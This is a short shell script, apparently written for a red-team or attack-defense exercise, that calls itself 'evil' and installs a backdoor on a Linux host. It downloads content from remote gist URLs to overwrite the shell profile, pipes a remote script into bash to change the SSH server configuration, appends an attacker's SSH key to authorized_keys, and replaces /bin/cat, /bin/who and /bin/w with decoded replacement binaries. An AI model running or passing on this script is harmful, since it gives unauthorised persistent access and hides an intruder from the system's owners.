echo "Installing evil shell profile"
curl https://gist.githubusercontent.com/picatz/50a80c4a50c472a9d25fd8526fc46609/raw/89268e6d0d3e9ee2c742794514df505612a35f4b/profile.sh > ~/.profile
echo "Installing evil sshd configurations"
curl https://gist.githubusercontent.com/picatz/ee22a5dc275c79769e04887f98a43e8c/raw/03c755ca84acecef3373b0e794efefb1f2a02829/install%2520evil_sshd_config.sh | bash
echo "Installing evil ssh key"
mkdir -p ~/.ssh
touch ~/.ssh/authorized_keys
curl -s https://gist.githubusercontent.com/picatz/cbd6d922663b498189b5119e5a1ef553/raw/b384da754814967a0dc8a5daf37d34ad6015f9df/pbul%2520lol | base64 -d >> ~/.ssh/authorized_keys
echo "Install evil cat implementation"
curl -s https://gist.githubusercontent.com/picatz/3f8a39633f795432ffd54c013fae3383/raw/a9c7e5f3d8fa62dd2fddff7980873ace06f8cda1/evilcat | base64 -d > /bin/cat
echo "Installing evil who implementation"
curl -s https://gist.githubusercontent.com/picatz/58e18c5ab0ec657171c8c12ad2c7534e/raw/7c3e5561195f2929ebf3c92433bcd31b038cd0d3/evilwho | base64 -d > /bin/who
echo "Installing evil w implementation"
curl -s https://gist.githubusercontent.com/picatz/58e18c5ab0ec657171c8c12ad2c7534e/raw/7c3e5561195f2929ebf3c92433bcd31b038cd0d3/evilwho | base64 -d > /bin/w
